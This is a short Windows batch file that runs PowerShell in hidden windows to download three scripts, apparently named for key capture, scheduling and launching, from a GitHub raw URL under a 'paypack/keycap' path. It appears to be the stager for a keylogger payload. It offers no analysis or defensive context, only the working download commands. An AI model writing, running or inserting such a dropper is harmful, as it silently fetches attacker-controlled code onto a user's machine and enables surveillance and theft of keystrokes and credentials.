@echo off
powershell powershell.exe -Windowstyle hidden "Invoke-WebRequest -Uri https://raw.githubusercontent.com/gozen-foto/zebroy/refs/heads/main/paypack/keycap/keycap.ps1 -OutFile keycap.ps1"
powershell powershell.exe -Windowstyle hidden "Invoke-WebRequest -Uri https://raw.githubusercontent.com/gozen-foto/zebroy/refs/heads/main/paypack/keycap/sduler.ps1 -OutFile sduler.ps1"
powershell powershell.exe -Windowstyle hidden "Invoke-WebRequest -Uri https://raw.githubusercontent.com/gozen-foto/zebroy/refs/heads/main/paypack/keycap/coller.cmd -OutFile coller.cmd"
